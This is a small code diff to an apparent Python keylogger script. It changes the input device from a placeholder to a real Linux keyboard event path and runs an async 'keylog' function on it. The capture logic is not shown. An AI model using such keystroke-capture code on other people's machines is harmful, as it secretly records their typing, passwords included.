@@ -10,6 +10,6 @@ async def keylog(dev):
 
 
 if __name__ == "__main__":
-    device = InputDevice('link')
+    device = InputDevice('/dev/input/by-path/platform-i8042-serio-0-event-kbd')
     loop = asyncio.get_event_loop()
     loop.run_until_complete(keylog(device))
